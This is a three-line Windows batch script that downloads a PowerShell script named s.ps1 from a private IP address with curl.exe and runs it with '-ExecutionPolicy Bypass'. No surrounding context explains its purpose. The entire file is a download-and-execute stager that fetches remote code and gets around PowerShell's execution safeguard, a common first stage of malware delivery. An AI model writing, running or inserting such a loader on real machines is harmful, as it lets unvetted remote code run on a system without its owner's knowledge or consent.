@echo off
curl.exe -L 192.168.122.1/s.ps1 -o s.ps1
powershell -NoProfile -ExecutionPolicy Bypass -File s.ps1
